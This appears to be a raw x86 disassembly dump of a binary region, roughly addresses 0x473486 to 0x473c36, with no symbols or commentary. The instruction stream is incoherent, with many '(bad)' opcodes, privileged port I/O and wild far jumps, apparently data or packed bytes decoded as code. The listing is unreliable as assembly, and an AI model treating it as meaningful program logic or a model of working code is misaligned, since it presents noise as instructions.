  473486:	mov    ah,0x4d
  473488:	aam    0x68
  47348a:	push   esp
  47348b:	or     al,0x7f
  47348d:	sbb    eax,0x187cfd7c
  473492:	fsubr  DWORD PTR [esp+ebp*2]
  473495:	cvtps2pd xmm3,QWORD PTR [edx]
  473498:	dec    esp
  473499:	stos   BYTE PTR es:[edi],al
  47349a:	xor    ah,0x3a
  47349d:	mov    bh,BYTE PTR [edi-0x41]
  4734a0:	fisubr WORD PTR [esi+0x30]
  4734a3:	stos   BYTE PTR es:[edi],al
  4734a4:	neg    ecx
  4734a6:	sbb    dh,bl
  4734a8:	stos   BYTE PTR es:[edi],al
  4734a9:	jmp    0x4734c5
  4734ab:	add    DWORD PTR [edx-0x76],0x74
  4734af:	pop    ss
  4734b0:	stos   BYTE PTR es:[edi],al
  4734b1:	loop   0x47350f
  4734b3:	jmp    0x473473
  4734b5:	mov    ebx,0x88130ff8
  4734ba:	les    eax,FWORD PTR [eax+0x66]
  4734bd:	stos   DWORD PTR es:[edi],eax
  4734be:	pop    ss
  4734bf:	pop    es
  4734c0:	inc    edx
  4734c1:	clc    
  4734c2:	dec    edi
  4734c3:	test   DWORD PTR gs:[edi+eax*1-0x3c],edx
  4734c8:	add    al,0x5c
  4734ca:	push   ds
  4734cb:	mov    bh,0xdf
  4734cd:	stos   DWORD PTR es:[edi],eax
  4734ce:	(bad)  
  4734cf:	fisttp QWORD PTR [ecx]
  4734d1:	and    cl,BYTE PTR [edx+0x49984665]
  4734d7:	sbb    esi,DWORD PTR [esi-0x4c]
  4734da:	sub    esp,eax
  4734dc:	(bad)  
  4734de:	inc    esi
  4734df:	cmp    dl,dh
  4734e1:	add    al,0x94
  4734e3:	leave  
  4734e4:	mov    al,0x45
  4734e6:	mov    bl,BYTE PTR [ebp-0x65]
  4734e9:	neg    BYTE PTR [edx]
  4734eb:	mov    ebp,0xd455bfd6
  4734f0:	dec    edx
  4734f1:	push   edi
  4734f2:	call   0xfa9c7164
  4734f7:	adc    ah,bh
  4734f9:	rol    al,0xe1
  4734fc:	jb     0x473503
  4734fe:	mov    edx,0x5263fa3
  473503:	push   ebp
  473504:	fcomip st,st(0)
  473506:	shr    bl,0x2a
  473509:	call   0x48c8:0x890a74ae
  473510:	hlt    
  473511:	test   BYTE PTR [edx+0x5],0x7f
  473515:	div    bl
  473517:	mov    bl,ah
  473519:	inc    ebx
  47351a:	test   eax,0x4b0f7449
  47351f:	jne    0x473515
  473521:	sbb    bh,dl
  473523:	fiadd  DWORD PTR [ecx-0x40]
  473526:	mov    dh,0xac
  473528:	in     eax,dx
  473529:	stos   BYTE PTR es:[edi],al
  47352a:	xor    al,0xeb
  47352c:	call   0x12425423
  473531:	fidivr WORD PTR [edi+0x7f]
  473534:	add    DWORD PTR [edx+0x4a7809e3],ebp
  47353a:	je     0x473548
  47353c:	inc    ecx
  47353d:	jne    0x473538
  47353f:	pop    ebp
  473540:	hlt    
  473541:	sti    
  473542:	lock shr BYTE PTR [edi+esi*8-0x3d],1
  473547:	xchg   esp,eax
  473548:	repnz repz jecxz 0x47356d
  47354c:	or     BYTE PTR [edx],bl
  47354e:	fld    QWORD PTR [edx]
  473550:	cmp    dh,BYTE PTR [edx+esi*8-0x47]
  473554:	shld   DWORD PTR [eax],edi,0x1c
  473558:	mov    BYTE PTR [edi],cl
  47355a:	jge    0x473554
  47355c:	scas   al,BYTE PTR es:[edi]
  47355d:	retf   
  47355e:	push   esp
  47355f:	lea    ebx,[ebx+ebx*4-0x46306c67]
  473566:	mov    al,0x41
  473568:	mov    al,0xea
  47356a:	sbb    eax,0x74403c7e
  47356f:	push   ds
  473570:	inc    esi
  473571:	cmp    al,0x24
  473573:	(bad)  
  473574:	stos   BYTE PTR es:[edi],al
  473575:	lahf   
  473576:	adc    dl,BYTE PTR [eax+ebx*1]
  473579:	or     bl,BYTE PTR [eax]
  47357b:	mov    dh,0x83
  47357d:	xchg   BYTE PTR [edx],al
  47357f:	pusha  
  473580:	add    DWORD PTR [esi],esi
  473582:	jne    0x473529
  473584:	int    0xf8
  473586:	inc    ebx
  473587:	loop   0x473555
  473589:	push   esi
  47358a:	mov    esi,DWORD PTR [edi-0x1e]
  47358d:	adc    al,0xa0
  47358f:	or     BYTE PTR [ebp-0x3c9dfa0a],al
  473595:	and    al,0x2a
  473597:	mov    bh,0xe7
  473599:	sti    
  47359a:	mov    dh,0x40
  47359c:	add    BYTE PTR [edx],ch
  47359e:	and    al,0x8
  4735a0:	and    al,0x20
  4735a2:	adc    al,0x2a
  4735a4:	and    BYTE PTR [eax],ch
  4735a6:	sub    BYTE PTR [ecx],ch
  4735a8:	inc    eax
  4735a9:	sub    eax,0x76edf3b9
  4735ae:	xor    esp,DWORD PTR [ebp*1+0x262d2a09]
  4735b5:	sub    ah,BYTE PTR [ecx+edx*2]
  4735b8:	jnp    0x473568
  4735ba:	jnp    0x473559
  4735bc:	sbb    cl,BYTE PTR [ecx]
  4735be:	and    al,0x26
  4735c0:	sub    eax,0x106f2d5b
  4735c5:	sub    eax,0xecf3ef81
  4735ca:	pushf  
  4735cb:	or     DWORD PTR [esi+ecx*1+0x30],esp
  4735cf:	sub    BYTE PTR [ecx],ch
  4735d1:	sub    BYTE PTR [edx],dh
  4735d3:	sub    ecx,ebp
  4735d5:	dec    esp
  4735d6:	xchg   esp,eax
  4735d7:	add    BYTE PTR [ecx],bl
  4735d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4735da:	loopne 0x47357e
  4735dc:	push   cs
  4735dd:	add    ebp,DWORD PTR [ebx+0x68]
  4735e0:	enter  0x4f00,0xbe
  4735e4:	int    0xb
  4735e6:	push   0x74
  4735e8:	push   esp
  4735e9:	test   DWORD PTR [edi-0x7a],ecx
  4735ec:	and    edx,DWORD PTR [edx]
  4735ee:	test   BYTE PTR ds:0x5d6ddd18,ch
  4735f4:	ss mov dx,ax
  4735f8:	and    eax,0xdfa8d411
  4735fd:	adc    eax,0x750d3da4
  473602:	and    ah,BYTE PTR [esi-0x9]
  473605:	inc    esi
  473606:	push   es
  473607:	add    dl,BYTE PTR [ecx]
  473609:	mov    ds,WORD PTR [edi]
  47360b:	cmc    
  47360c:	xchg   ebp,eax
  47360d:	mov    ah,0x9
  47360f:	cmp    DWORD PTR [esi-0x57],0x9b324003
  473616:	mov    ds:0x43c6c33f,al
  47361b:	inc    esi
  47361c:	push   0xffffff85
  47361e:	xor    bl,bl
  473620:	cs je  0x473662
  473623:	imul   eax,eax,0xd0e096a4
  473629:	adc    BYTE PTR [ebp+0x10],cl
  47362c:	add    al,ah
  47362e:	cs sbb al,0x19
  473631:	js     0x47361a
  473633:	xchg   cl,bl
  473635:	loope  0x47368a
  473637:	mov    edi,0x533fe8fa
  47363c:	and    DWORD PTR [eax-0x2d0326a5],eax
  473642:	fld    TBYTE PTR [edi-0x2627f798]
  473648:	(bad)  [edi-0x53]
  47364c:	(bad)  
  47364d:	in     eax,dx
  47364e:	jge    0x473646
  473650:	fwait
  473651:	mov    dh,0x45
  473653:	test   BYTE PTR [eax],0x41
  473656:	je     0x473661
  473658:	fidiv  DWORD PTR [edi-0x20a300cd]
  47365e:	jne    0x473648
  473660:	(bad)  
  473661:	cld    
  473662:	out    dx,eax
  473663:	clc    
  473664:	idiv   DWORD PTR [ebx+0x3]
  473667:	mov    edx,0x8a9b7809
  47366c:	inc    esp
  47366d:	sub    ah,bh
  47366f:	nop
  473670:	shr    al,0x4
  473673:	and    ah,0xf
  473676:	add    ax,0x3030
  47367a:	jle    0x473657
  47367c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47367d:	jo     0x4736d5
  47367f:	cmp    cl,BYTE PTR [eax+eax*8+0x3f888aa]
  473686:	jge    0x473690
  473688:	jns    0x473691
  47368a:	jbe    0x473686
  47368c:	mov    es,WORD PTR [ecx+ebp*1]
  47368f:	test   BYTE PTR [eax+0x3b],bl
  473692:	jge    0x4736a0
  473694:	pushf  
  473695:	or     dh,ch
  473697:	mov    esi,0xff83fffd
  47369c:	adc    dh,BYTE PTR [ebx+0x27]
  47369f:	cmp    BYTE PTR [ebx+edi*1+0x3],0x35
  4736a4:	jb     0x4736cb
  4736a6:	mov    BYTE PTR [esp+ecx*1+0x0],0x4f
  4736ab:	js     0x4736ba
  4736ad:	dec    BYTE PTR [esi]
  4736af:	and    eax,0xfe0aee0c
  4736b4:	cmp    DWORD PTR [edi-0x13],esi
  4736b7:	jmp    0x4736d8
  4736b9:	data16 (bad) 
  4736bb:	pusha  
  4736bc:	xor    ecx,ecx
  4736be:	jmp    0x4736d4
  4736c0:	mov    edi,0xdc16013b
  4736c5:	fisttp QWORD PTR [ecx+0x19]
  4736c8:	inc    ecx
  4736c9:	xor    BYTE PTR [ecx+esi*8-0xa],dh
  4736cd:	push   esi
  4736ce:	or     BYTE PTR [eax],dl
  4736d0:	loope  0x4736bd
  4736d2:	scas   al,BYTE PTR es:[edi]
  4736d3:	mul    BYTE PTR [esi-0x3f]
  4736d6:	jmp    0xc302:0x536889da
  4736dd:	xchg   esp,eax
  4736de:	out    dx,al
  4736df:	test   BYTE PTR [edi],bl
  4736e1:	inc    edi
  4736e2:	cmp    eax,0x1e9e6472
  4736e7:	adc    BYTE PTR [edi],ah
  4736e9:	jno    0x47374a
  4736eb:	mov    ch,0x33
  4736ed:	retf   
  4736ee:	push   esi
  4736ef:	add    al,0x3e
  4736f1:	or     ecx,edx
  4736f3:	je     0x7ad963b0
  4736f9:	xchg   edi,eax
  4736fa:	rcr    BYTE PTR [eax-0x270831f2],0x83
  473701:	fiadd  DWORD PTR [edx+0x30817537]
  473707:	or     BYTE PTR [eax],cl
  473709:	or     edi,edi
  47370b:	adc    al,0x14
  47370d:	sti    
  47370e:	(bad)  
  47370f:	in     eax,dx
  473710:	lock add al,0x7c
  473713:	pop    ds
  473714:	mov    edi,0x7c2d4153
  473719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47371a:	sbb    edx,0xde0b6b3
  473720:	jae    0x473714
  473722:	dec    ecx
  473723:	add    eax,0x6fdaa1b
  473728:	in     eax,0xd2
  47372a:	inc    esi
  47372b:	loopne 0x4736b6
  47372d:	push   ebp
  47372e:	in     al,0xdf
  473730:	ins    DWORD PTR es:[edi],dx
  473731:	or     bh,dl
  473733:	call   eax
  473735:	or     al,0x7
  473737:	cmc    
  473738:	cmp    cl,BYTE PTR [edx]
  47373a:	cmp    al,0xda
  47373c:	mov    ah,0x87
  47373e:	aas    
  47373f:	xchg   ebp,eax
  473740:	loope  0x4736e4
  473742:	sbb    DWORD PTR [eax+edi*4],ebx
  473745:	setnp  BYTE PTR [ebp+esi*2+0x700bb91b]
  47374d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47374e:	rcr    DWORD PTR [ecx],0x16
  473751:	sub    DWORD PTR [ebp+0x1e],esi
  473754:	pushf  
  473755:	and    al,0xf
  473757:	mov    DWORD PTR [ecx+0x1f75ebbe],ecx
  47375d:	dec    ecx
  47375e:	sub    bl,ch
  473760:	cmp    DWORD PTR [eax+0x3f7c04c8],ecx
  473766:	jg     0x4737bf
  473768:	cmp    esi,DWORD PTR [edi+0x20]
  47376b:	inc    ecx
  47376c:	or     al,0x42
  47376e:	jmp    0x2903:0x134c8d00
  473775:	enter  0x82c6,0x41
  473779:	rol    DWORD PTR [edx+0x3f80ce07],0xc6
  473780:	div    DWORD PTR [esi-0x44]
  473783:	add    eax,0x1fc38286
  473788:	jmp    0x4737fe
  47378a:	mov    dh,0x88
  47378c:	sbb    cl,bh
  47378e:	jp     0x4737c6
  473790:	push   ds
  473791:	scas   eax,DWORD PTR es:[edi]
  473792:	inc    esp
  473793:	pop    eax
  473794:	pop    edi
  473795:	mov    al,0x23
  473797:	sbb    DWORD PTR [eax+eax*2-0x2fdda865],0x890f1bf0
  4737a2:	retf   
  4737a3:	f2xm1  
  4737a6:	fwait
  4737a7:	hlt    
  4737a8:	pop    edi
  4737a9:	mov    esp,0x5678f8b8
  4737ae:	fldz   
  4737b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4737b1:	xchg   bl,ah
  4737b3:	mov    bh,BYTE PTR [esi]
  4737b5:	cmp    bh,0x2b
  4737b8:	push   0x6f
  4737ba:	jmp    0x175:0x2d08ac4d
  4737c1:	inc    esi
  4737c2:	pop    ecx
  4737c3:	xchg   dh,ch
  4737c5:	outs   dx,DWORD PTR ds:[esi]
  4737c6:	js     0x47377f
  4737c8:	das    
  4737c9:	je     0x473805
  4737cb:	pusha  
  4737cc:	jne    0x4737d6
  4737ce:	inc    esi
  4737cf:	sbb    eax,0x74f1393c
  4737d4:	dec    edi
  4737d5:	fidivr WORD PTR [edi-0x1e]
  4737d8:	outs   dx,DWORD PTR ds:[esi]
  4737d9:	and    al,0x24
  4737db:	fistp  QWORD PTR [eax*2+0x8460a75]
  4737e2:	xchg   DWORD PTR [edx],ecx
  4737e4:	pop    eax
  4737e5:	add    edx,eax
  4737e7:	jg     0x4737f1
  4737e9:	xor    al,al
  4737eb:	mov    edi,0x89337598
  4737f0:	rcr    BYTE PTR [esi+0x1d2eec04],1
  4737f6:	push   0x24
  4737f8:	push   edi
  4737f9:	mov    ds:0x30e0d902,eax
  4737fe:	ror    ch,cl
  473800:	cli    
  473801:	mov    edx,DWORD PTR [eax]
  473803:	add    al,0xdf
  473805:	aas    
  473806:	jmp    0x47380a
  473808:	fstp   TBYTE PTR [edi]
  47380a:	je     0x473872
  47380c:	test   eax,0x81018209
  473811:	(bad)
  473814:	add    DWORD PTR [esp+eax*4-0x48],edx
  473818:	xlat   BYTE PTR ds:[ebx]
  473819:	add    BYTE PTR [esi],0x17
  47381c:	ins    DWORD PTR es:[edi],dx
  47381d:	and    ch,bl
  47381f:	push   esi
  473820:	int    0x4
  473822:	cmp    al,0x20
  473824:	std    
  473825:	sbb    ecx,DWORD PTR [eax]
  473827:	and    BYTE PTR [esp+eax*4+0x3a2cacb1],bh
  47382e:	add    al,0xa
  473830:	jae    0x473841
  473832:	fcmovu st,st(5)
  473834:	pop    edx
  473835:	inc    eax
  473836:	inc    esp
  473837:	adc    BYTE PTR [ebx-0x26],ah
  47383a:	add    al,0x42
  47383c:	jmp    0x473828
  47383e:	mov    al,ds:0x379d1034
  473843:	mov    cl,BYTE PTR [esi]
  473845:	neg    BYTE PTR [edi-0x7]
  473848:	add    DWORD PTR [esi],ebp
  47384a:	clc    
  47384b:	dec    edi
  47384c:	es push ebx
  47384e:	push   cs
  47384f:	inc    esi
  473850:	imul   edx,edx,0xa
  473853:	push   ds
  473854:	cmp    edx,0xd8c90f4
  47385a:	sub    dh,0x72
  47385d:	jmp    0xd2ea:0x2b680237
  473864:	xchg   dl,bh
  473866:	xchg   eax,eax
  473868:	jae    0x4738d4
  47386a:	bsf    edx,DWORD PTR [ebp+0x5c]
  47386e:	pop    eax
  47386f:	mov    ds:0x2cc0cc0b,eax
  473874:	sbb    al,0xcd
  473876:	dec    eax
  473877:	pusha  
  473878:	xchg   ecx,eax
  473879:	out    0x55,al
  47387b:	rcl    BYTE PTR [ebp+0x2dc8395b],0x30
  473882:	fistp  WORD PTR [edi+0x0]
  473885:	mov    cl,0x1
  473887:	dec    edi
  473888:	or     BYTE PTR [edi],cl
  47388a:	sub    esp,ebp
  47388c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47388d:	mov    al,ds:0xecb215df
  473892:	pop    eax
  473893:	std    
  473894:	aam    0xb3
  473896:	xchg   BYTE PTR [ecx+edi*8],ch
  473899:	rcr    DWORD PTR [ebx+ecx*8+0x34],cl
  47389d:	sub    cl,BYTE PTR [eax+edx*1]
  4738a0:	or     al,0xa1
  4738a2:	inc    esp
  4738a3:	jo     0x4738e0
  4738a5:	add    dh,BYTE PTR [esi+0x242cdb07]
  4738ab:	push   0x77675b14
  4738b0:	pop    edx
  4738b1:	iret   
  4738b2:	call   0xad62:0x7eefd64c
  4738b9:	not    bh
  4738bb:	repnz mov ch,0xbe
  4738be:	sbb    ch,0x1e
  4738c1:	fwait
  4738c2:	dec    ebx
  4738c3:	scas   al,BYTE PTR es:[edi]
  4738c4:	fidiv  DWORD PTR [ebp+0x12d957b7]
  4738ca:	pop    eax
  4738cb:	repnz (bad) 
  4738cd:	out    0xb1,eax
  4738cf:	add    eax,eax
  4738d1:	mov    eax,ds:0x312ef4dd
  4738d6:	fstp   TBYTE PTR [edx]
  4738d8:	fld    QWORD PTR [ebp+0x8]
  4738db:	inc    edx
  4738dc:	jl     0x4738d8
  4738de:	lahf   
  4738df:	cmp    al,0x85
  4738e1:	xchg   ebx,eax
  4738e2:	xor    DWORD PTR [esi+0x11],ecx
  4738e5:	div    DWORD PTR [ebx-0x26164f80]
  4738eb:	jbe    0x47391f
  4738ed:	adc    al,0xeb
  4738ef:	push   es
  4738f0:	adc    eax,DWORD PTR ds:0x89c8955a
  4738f6:	adc    DWORD PTR [eax-0x7f],ecx
  4738f9:	in     al,0x92
  4738fb:	push   esp
  4738fc:	out    0x8,al
  4738fe:	add    eax,0x5e80d5ad
  473903:	or     al,0x44
  473905:	inc    eax
  473906:	sar    DWORD PTR [ebp+ebx*2+0x4d73182e],cl
  47390d:	or     bh,dl
  47390f:	cmp    al,0x73
  473911:	inc    edi
  473912:	stc    
  473913:	inc    ecx
  473914:	push   0x62
  473916:	xchg   ebp,eax
  473917:	dec    ebx
  473918:	jl     0x473930
  47391a:	jae    0x473956
  47391c:	sub    al,0xf5
  47391e:	push   0xffffffe2
  473920:	pop    ebp
  473921:	fiadd  WORD PTR [eax+0x380036ee]
  473927:	imul   edx,edx,0x6c8aea60
  47392d:	pop    edx
  47392e:	and    DWORD PTR [esi-0x3e],esi
  473931:	adc    al,0xd1
  473933:	call   0x8082b33b
  473938:	mov    BYTE PTR [edx],bh
  47393a:	or     al,0xdb
  47393c:	add    al,0xd8
  47393e:	xor    eax,0x6b5a9920
  473943:	std    
  473944:	dec    eax
  473945:	pop    esi
  473946:	or     ch,bl
  473948:	sbb    BYTE PTR [ebx+0x5c02ecae],bl
  47394e:	stos   BYTE PTR es:[edi],al
  47394f:	sahf   
  473950:	pop    esi
  473951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  473952:	mov    cs,ebx
  473954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  473955:	dec    esp
  473956:	(bad)  
  473958:	or     al,BYTE PTR [ebx-0x77]
  47395b:	pop    ebx
  47395c:	xor    WORD PTR [esi],ax
  47395f:	dec    esi
  473960:	add    eax,0x37cf1e14
  473965:	mov    BYTE PTR [eax+0x57d67761],dh
  47396b:	mov    al,ds:0x417188a1
  473970:	outs   dx,BYTE PTR ds:[esi]
  473971:	lock fnstsw WORD PTR [eax]
  473974:	and    edi,ebx
  473976:	dec    edx
  473977:	sbb    al,0xa4
  473979:	aas    
  47397a:	jg     0x473970
  47397c:	dec    edx
  47397d:	imul   edi,DWORD PTR [ebp-0x58],0x1075ff94
  473984:	ret    0x77c1
  473987:	mov    ds:0x6c7bb813,eax
  47398c:	hlt    
  47398d:	lea    ecx,[ebp-0x2]
  473990:	mov    dx,0x3e46
  473994:	adc    eax,0xd47d3a0a
  473999:	mov    dl,0xcb
  47399b:	fcomp  DWORD PTR [esi]
  47399d:	cmp    al,0x0
  47399f:	xchg   esi,eax
  4739a0:	int    0xbb
  4739a2:	pop    ebx
  4739a3:	(bad)  
  4739a5:	and    al,0xfc
  4739a7:	call   0x9b9524af
  4739ac:	jecxz  0x47396a
  4739ae:	cdq    
  4739af:	push   ebx
  4739b0:	pop    eax
  4739b1:	enter  0x83c1,0xe0
  4739b5:	add    esi,DWORD PTR [edx]
  4739b7:	mov    al,0xa0
  4739b9:	adc    eax,0xd9122190
  4739be:	and    BYTE PTR [esi-0x1234529c],bh
  4739c4:	aaa    
  4739c5:	xor    edi,esi
  4739c7:	test   BYTE PTR [ebp+0x1c1475d2],0xb9
  4739ce:	nop
  4739cf:	add    ecx,esi
  4739d1:	sar    DWORD PTR [edx],0x5
  4739d4:	lods   al,BYTE PTR ds:[esi]
  4739d5:	jo     0x4739ee
  4739d7:	das    
  4739d8:	ret    0xbc1
  4739db:	pop    eax
  4739dc:	fwait
  4739dd:	cdq    
  4739de:	and    eax,0xff3b6f6d
  4739e3:	mov    DWORD PTR [esp+ebx*4+0x40048d7f],edi
  4739ea:	add    al,0xc5
  4739ec:	fdiv   st(7),st
  4739ee:	jo     0x4739cf
  4739f0:	jo     0x473a49
  4739f2:	scas   al,BYTE PTR es:[edi]
  4739f3:	inc    BYTE PTR [ecx]
  4739f5:	jb     0xffde889
  4739fb:	daa    
  4739fc:	ja     0x387e3785
  473a02:	inc    edx
  473a03:	and    DWORD PTR [edx+0x72],edx
  473a06:	jge    0x473a12
  473a08:	or     al,0x77
  473a0a:	ja     0x473a2b
  473a0c:	or     BYTE PTR [esi+eiz*4-0x38e04ea],dh
  473a13:	(bad)  
  473a14:	dec    eax
  473a15:	cmp    ebx,DWORD PTR [ebp+edx*1-0x66]
  473a19:	mov    eax,ds:0x77fe42f7
  473a1e:	sbb    BYTE PTR fs:[eax-0x2],cl
  473a22:	adc    edi,esi
  473a24:	pmaxub mm7,mm6
  473a27:	popf   
  473a28:	sub    eax,0xfe4a5c03
  473a2d:	inc    ecx
  473a2e:	dec    eax
  473a2f:	jne    0x473a25
  473a31:	xor    dh,cl
  473a33:	dec    ecx
  473a34:	mov    eax,ecx
  473a36:	dec    ebx
  473a37:	cdq    
  473a38:	add    cl,BYTE PTR [ecx]
  473a3a:	lahf   
  473a3b:	cli    
  473a3c:	idiv   esi
  473a3e:	imul   esi,ecx,0xedd14e6d
  473a44:	in     eax,dx
  473a45:	jbe    0x473aa7
  473a47:	aas    
  473a48:	add    esi,edx
  473a4a:	sub    esi,eax
  473a4c:	ds ins DWORD PTR es:[edi],dx
  473a4e:	ds stc 
  473a50:	add    esi,eax
  473a52:	pop    esi
  473a53:	ret    
  473a54:	inc    ebp
  473a55:	test   DWORD PTR [ebp+0x6c],edi
  473a58:	or     BYTE PTR [ecx+0x5c7a07ee],al
  473a5e:	hlt    
  473a5f:	push   ecx
  473a60:	add    ebp,DWORD PTR [ecx-0x5e]
  473a63:	push   es
  473a64:	idiv   DWORD PTR [ecx+0x14]
  473a67:	pop    ds
  473a68:	adc    ch,BYTE PTR [edi-0x37]
  473a6b:	push   esp
  473a6c:	cmp    DWORD PTR [ecx+0x7a8f4f8],ecx
  473a72:	jns    0x473ad4
  473a74:	jb     0x473a7a
  473a76:	and    al,0x59
  473a78:	pop    ss
  473a79:	aaa    
  473a7a:	nop
  473a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  473a7c:	xchg   DWORD PTR [edi+0x1fe14ce4],edi
  473a82:	sbb    DWORD PTR [edx],ecx
  473a84:	xor    esp,esp
  473a86:	dec    ebp
  473a87:	call   0x24c70411
  473a8c:	mov    esi,DWORD PTR [edx-0x2e]
  473a8f:	pop    esi
  473a90:	shl    dl,cl
  473a92:	in     al,0xe
  473a94:	clc    
  473a95:	hlt    
  473a96:	pusha  
  473a97:	pop    es
  473a98:	sbb    al,0xda
  473a9a:	or     BYTE PTR [ebx],al
  473a9c:	mov    ch,0xc6
  473a9e:	mov    WORD PTR ds:0xe4606ec0,?
  473aa4:	mov    ds:0x49ce4207,al
  473aa9:	add    ax,0xff6c
  473aad:	(bad)  
  473aae:	out    0x81,al
  473ab0:	stc    
  473ab1:	mov    cl,0x3a
  473ab3:	add    al,BYTE PTR [eax]
  473ab5:	jl     0x473aca
  473ab7:	add    DWORD PTR [eax+0x2],0xaced43c6
  473abe:	mov    DWORD PTR [eax+0x7d2501e2],ebp
  473ac4:	in     eax,dx
  473ac5:	shl    dl,0x48
  473ac8:	das    
  473ac9:	scas   al,BYTE PTR es:[edi]
  473aca:	pop    eax
  473acb:	push   es
  473acc:	sahf   
  473acd:	lods   al,BYTE PTR ds:[esi]
  473ace:	mov    ss,WORD PTR [ecx+0x59b666a1]
  473ad4:	mov    ebx,0x4c047ea0
  473ad9:	dec    WORD PTR [ebp+0x28]
  473add:	cmp    DWORD PTR [eax],0x3c6b662c
  473ae3:	int    0x85
  473ae5:	mov    ebp,0xd8666486
  473aea:	push   ebx
  473aeb:	sub    dl,bh
  473aed:	repnz mov ch,0x84
  473af0:	jbe    0x473aa3
  473af2:	mov    dl,0x5
  473af4:	pop    ecx
  473af5:	lods   al,BYTE PTR ds:[esi]
  473af6:	shl    eax,0x2
  473af9:	cmp    edx,DWORD PTR [ebx+esi*4+0x0]
  473afd:	xor    edx,DWORD PTR [eax+0x5d4e2a95]
  473b03:	mov    cl,0x40
  473b05:	stos   BYTE PTR es:[edi],al
  473b06:	clc    
  473b07:	mov    DWORD PTR [eax-0x3d75c175],esi
  473b0d:	push   eax
  473b0e:	adc    ebp,ecx
  473b10:	inc    eax
  473b11:	mov    bh,0xec
  473b13:	data16 test al,0x7e
  473b16:	enter  0x5c13,0xc7
  473b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  473b1b:	adc    BYTE PTR [esp+ecx*2+0x6c89ea4e],ch
  473b22:	out    dx,al
  473b23:	pushf  
  473b24:	fwait
  473b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  473b26:	mov    dl,0x5a
  473b28:	cmp    ecx,DWORD PTR [esi]
  473b2a:	jb     0x473ac6
  473b2c:	sbb    ch,BYTE PTR [ecx]
  473b2e:	inc    eax
  473b2f:	jmp    0x473b61
  473b31:	push   edx
  473b32:	lea    esp,[esp+ebx*8+0x4ed819c3]
  473b39:	xor    eax,ecx
  473b3b:	inc    ecx
  473b3c:	xchg   edx,eax
  473b3d:	add    BYTE PTR [esp+edx*1],ah
  473b40:	hlt    
  473b41:	push   0x5c92b00a
  473b46:	scas   eax,DWORD PTR es:[edi]
  473b47:	push   ecx
  473b48:	add    DWORD PTR [ebx],0xf01ca1d8
  473b4e:	jle    0x473b54
  473b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  473b51:	(bad)  
  473b52:	popf   
  473b53:	rcl    bl,cl
  473b55:	(bad)  
  473b56:	aad    0x8a
  473b58:	clc    
  473b59:	pop    esi
  473b5a:	xchg   ebp,eax
  473b5b:	jg     0x473bc3
  473b5d:	js     0x473b30
  473b5f:	mov    al,0x3d
  473b61:	clc    
  473b62:	cmc    
  473b63:	cld    
  473b64:	mov    ecx,0x56f2f96f
  473b69:	retf   
  473b6a:	aam    0x92
  473b6c:	inc    eax
  473b6d:	jmp    0x33cb23ba
  473b72:	mov    bh,0x7
  473b74:	fild   QWORD PTR [eax+0x10]
  473b77:	sub    BYTE PTR [esi+ecx*1],ah
  473b7a:	or     BYTE PTR [esp+0xa],dl
  473b7e:	sub    bl,bl
  473b80:	push   ss
  473b81:	scas   al,BYTE PTR es:[edi]
  473b82:	mov    ebx,0x1cddc8a1
  473b87:	pusha  
  473b88:	mov    WORD PTR [esi+0x18],cs
  473b8b:	ret    
  473b8c:	push   edi
  473b8d:	dec    edx
  473b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  473b8f:	fist   DWORD PTR [esi]
  473b91:	adc    al,0x16
  473b93:	push   eax
  473b94:	arpl   WORD PTR [eax],bx
  473b96:	push   ss
  473b97:	imul   eax,DWORD PTR [edx-0x76eb60db],0xe0be0e20
  473ba1:	fwait
  473ba2:	(bad)  
  473ba3:	in     eax,dx
  473ba4:	and    bl,BYTE PTR [eax+eax*4-0x65]
  473ba8:	cdq    
  473ba9:	fcom   QWORD PTR [eax]
  473bab:	fisttp DWORD PTR [ebx-0x16]
  473bae:	pop    eax
  473baf:	sbb    BYTE PTR [ecx+0x54f00620],ah
  473bb5:	xchg   edi,eax
  473bb6:	mov    dl,BYTE PTR [ecx]
  473bb8:	add    dh,BYTE PTR [ebx+eiz*1+0x10]
  473bbc:	iret   
  473bbd:	push   edx
  473bbe:	mov    ebx,0x127ea07a
  473bc3:	cmp    BYTE PTR [ebx],ch
  473bc5:	cdq    
  473bc6:	cld    
  473bc7:	mov    esp,0xa85404d3
  473bcc:	retf   
  473bcd:	call   0x76178ac
  473bd2:	loopne 0x473bbb
  473bd4:	mov    fs,eax
  473bd6:	xchg   edx,eax
  473bd7:	and    eax,0x11948d40
  473bdc:	mov    ?,WORD PTR [eax-0x1dab59d9]
  473be2:	push   ebp
  473be3:	or     BYTE PTR [ecx],al
  473be5:	cwde   
  473be6:	xor    esi,DWORD PTR [edx]
  473be8:	push   ss
  473be9:	inc    ebx
  473bea:	add    cl,dh
  473bec:	outs   dx,DWORD PTR ds:[esi]
  473bed:	div    BYTE PTR [edi+0x3a17a49]
  473bf3:	adc    DWORD PTR [ebp-0x5c0a6ac],ecx
  473bf9:	xor    ah,BYTE PTR [eax+0x10]
  473bfc:	xchg   esp,eax
  473bfd:	fisttp DWORD PTR [edx+0x6a]
  473c00:	add    al,0x6a
  473c02:	adc    eax,0xe03e6a6a
  473c07:	sub    al,0xe4
  473c09:	mov    eax,0xc0ec0ce8
  473c0e:	outs   dx,BYTE PTR ds:[esi]
  473c0f:	mov    al,ds:0xaae06442
  473c14:	mov    ecx,0xf49d0784
  473c19:	popa   
  473c1a:	adc    dh,0xba
  473c1d:	xor    BYTE PTR [ebp-0x30],ch
  473c20:	adc    eax,0x1cd0dd95
  473c25:	(bad)  
  473c26:	dec    ebp
  473c27:	inc    edx
  473c28:	ins    DWORD PTR es:[edi],dx
  473c29:	sub    al,0xad
  473c2b:	out    dx,eax
  473c2c:	or     BYTE PTR [edx],bh
  473c2e:	adc    BYTE PTR [eax-0x474a03e1],dh
  473c34:	jmp    0x473c38
  473c36:	push   ss
